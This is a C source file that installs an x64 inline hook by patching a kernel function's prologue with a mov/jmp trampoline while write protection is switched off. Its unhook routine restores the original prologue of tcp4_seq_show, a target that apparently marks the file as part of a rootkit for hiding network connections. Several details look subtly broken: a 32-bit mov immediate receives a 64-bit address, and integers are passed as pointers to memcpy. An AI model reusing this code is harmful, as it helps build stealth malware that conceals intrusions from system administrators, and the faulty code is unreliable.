
#include "pch.h"
#include "utils64.h" 

#define ORIGINAL_PATTERN_SZ 13
struct inlHook 
{
    unsigned long targetFunc;   /* target function */
    unsigned long myFunc;       /* our hook */
    
    unsigned char originalPattern[ORIGINAL_PATTERN_SZ]; 
    size_t _szMov; 
    size_t _szJmp; 
}; 

/* mov rax, [addr] pattern */ 
static unsigned char movPattern[] = {  0x48, 0xC7, 0xC0, 0x00, 0x00, 0x00, 0x00 };  
/* jmp rax pattern */ 
static unsigned char jmpPattern[] = { 0xFF, 0xE0, 0xC3 }; 

static struct inlHook hook;

void tramp(void)
{    
    /* -1 for the ret */
    asm volatile("jmp *%0" : : "r" (hook.targetFunc + (hook._szMov + hook._szJmp) - 1));   
}

void inline_hook_x64(unsigned long toHook, unsigned long theHook)
{

    /* saving hook function address */ 
    hook.myFunc = (unsigned long)theHook; 
     
    /* saving the target function address inorder to resume execution*/ 
    hook.targetFunc = toHook; 

    /* moving the hook function address to RAX register */ 
    *(unsigned long*)&movPattern[3] = (unsigned long)theHook;
   
    /* allocating a buffer for the pattern */ 
    size_t szMovPattern = sizeof(movPattern); 
    size_t szJmpPattern = sizeof(jmpPattern); 
    
    hook._szMov = szMovPattern; 
    hook._szJmp = szJmpPattern; 

    wpOFF(); 
    /* copying the rest of the pattern to the target function */ 
    /* moving 7 bytes to copy to the next instruction */
    memcpy((unsigned long)toHook, movPattern, szMovPattern);
    memcpy((unsigned long)(toHook + szMovPattern), jmpPattern, szJmpPattern);
    wpON();
   // kvfree(buffer); 
}

void inline_unhook_x64(void)
{
    /* original tcp4_seq_show prolog */ 
    unsigned char patternOld[] =  { 0x41, 0x57, 0x41, 0x56, 0x41, 0x55, 0x41, 0x54, 0x55, 0x48, 0x89, 0xFD, 0x53 }; 
    memcpy(hook.originalPattern, patternOld, sizeof(patternOld)); 

    wpOFF(); 
    memcpy(hook.targetFunc, hook.originalPattern, sizeof(hook.originalPattern)); 
    wpON(); 
}
